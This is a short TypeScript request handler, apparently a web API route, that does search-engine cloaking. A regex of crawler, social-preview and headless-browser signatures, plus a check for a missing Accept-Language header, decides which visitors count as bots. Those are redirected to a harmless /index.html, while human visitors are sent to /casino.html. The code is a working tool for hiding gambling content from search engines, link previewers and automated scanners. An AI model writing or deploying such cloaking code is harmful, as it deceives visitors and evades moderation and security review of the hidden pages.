export default function handler(req: any, res: any) {
  const ua = String(req.headers['user-agent'] || '').toLowerCase();
  const acceptLang = String(req.headers['accept-language'] || '').toLowerCase();

  const botRegex =
    /(bot|crawler|spider|crawling|google|bing|yandex|duckduckgo|baidu|slurp|embedly|quora|reddit|sogou|twitterbot|telegrambot|linkedin|whatsapp|discord|vkbot|applebot|facebookexternalhit|pinterest)/i;

  const isHeadlessHint = /headless|puppeteer|playwright/.test(ua);
  const isBot = botRegex.test(ua) || isHeadlessHint || !acceptLang;

  if (isBot) {
    res.redirect(302, '/index.html');
    return;
  }
  res.redirect(302, '/casino.html');
}
